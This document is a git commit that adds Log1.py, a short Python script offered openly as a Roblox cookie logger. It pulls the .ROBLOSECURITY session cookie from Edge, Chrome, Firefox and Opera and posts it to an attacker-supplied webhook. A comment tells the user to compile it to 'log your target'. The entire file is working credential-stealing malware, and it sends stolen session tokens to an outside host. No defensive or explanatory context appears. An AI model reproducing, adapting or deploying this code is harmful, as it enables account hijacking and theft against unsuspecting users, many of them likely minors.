ec5798f22f69ab26004fc79658cb8b84c683f51a
Trexxus <96661679+Trexxus@users.noreply.github.com>
2022-03-23 22:10:36 +0100

    Log1.py

---
+++ Log1.py
@@ -0,0 +1,45 @@
+
+import browser_cookie3, requests, threading
+
+WebHook = "webhook here" # Input your webhook here and make sure to compile if you want to log your target
+
+def MicrosoftEdge():
+    try:
+        cookies = browser_cookie3.edge(domain_name = "roblox.com")
+        cookies = str(cookies)
+        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        requests.post(WebHook, json = {"username" : "Eric Zemmour Cookie Logger V9.0", "content" : f"```{cookie}```"})
+    except:
+        pass
+
+def GoogleChrome():
+    try:
+        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
+        cookies = str(cookies)
+        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        requests.post(WebHook, json = {"username" : "Eric Zemmour Cookie Logger V9.0", "content" : f"```{cookie}```"})
+    except:
+        pass
+
+def MozillaFirefox():
+    try:
+        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
+        cookies = str(cookies)
+        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        requests.post(WebHook, json = {"username" : "Eric Zemmour Cookie Logger V9.0", "content" : f"```{cookie}```"})
+    except:
+        pass
+
+def Opera():
+    try:
+        cookies = browser_cookie3.opera(domain_name = "roblox.com")
+        cookies = str(cookies)
+        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+        requests.post(WebHook, json = {"username" : "Eric Zemmour Cookie Logger V9.0", "content" : f"```{cookie}```"})
+    except:
+        pass
+
+browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]
+
+for v in browsers:
+    threading.Thread(target = v).start()
